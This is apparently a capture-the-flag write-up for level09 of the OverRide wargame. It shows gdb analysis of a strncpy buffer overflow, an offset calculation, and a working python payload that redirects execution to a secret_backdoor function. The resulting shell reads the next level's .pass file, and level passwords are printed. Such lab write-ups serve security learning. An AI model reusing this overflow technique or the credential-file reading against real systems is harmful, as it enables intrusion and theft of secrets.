# Level 09
*password : fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S*

## Analyze

```
scp -P 4242 level09@192.168.56.109:level09 binary/
```
Interesting part:
```
strncpy(buffer, msg, buffer[180]);
```
buffer[180] is filled by username

## Buffer overflow : strncpy exploit

**objective** : execute `secret_backdoor`

```
(gdb) info funct secret_backdoor
All functions matching regular expression "secret_backdoor":

Non-debugging symbols:
0x000055555555488c  secret_backdoor
```
`secret_backdoor()` address : 0x000055555555488c\

---
### Compute offset

```
(gdb) b *handle_msg+95
Breakpoint 1 at 0x91f
(gdb) run
(gdb) i f
Stack level 0, frame at 0x7fffffffe5d0:
 rip = 0x55555555491f in handle_msg; saved rip 0x555555554abd
 called by frame at 0x7fffffffe5e0
 Arglist at 0x7fffffffe5c0, args: 
 Locals at 0x7fffffffe5c0, Previous frame's sp is 0x7fffffffe5d0
 Saved registers:
  rbp at 0x7fffffffe5c0, rip at 0x7fffffffe5c8
(gdb) x/x $rdi
0x7fffffffe500: 0x0000000a
```
- rip at 0x7fffffffe5c8
- buffer at 0x7fffffffe500

`0x7fffffffe5c8 - 0x7fffffffe500 = c8` (200 in decimal)

---

- rip offset found : 200 
- `buffer[180]` : 200 + 8 = 208 (d0 in hexadecimal)

```
$ python -c 'print "\x41" * 40 + "\xd0" + "\n" + "\x41" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"' > /tmp/level09 ; cat /tmp/level09 - | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
/bin/sh
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
```
$ su end
Password: 
end@OverRide:~$ cat end
GG !
```
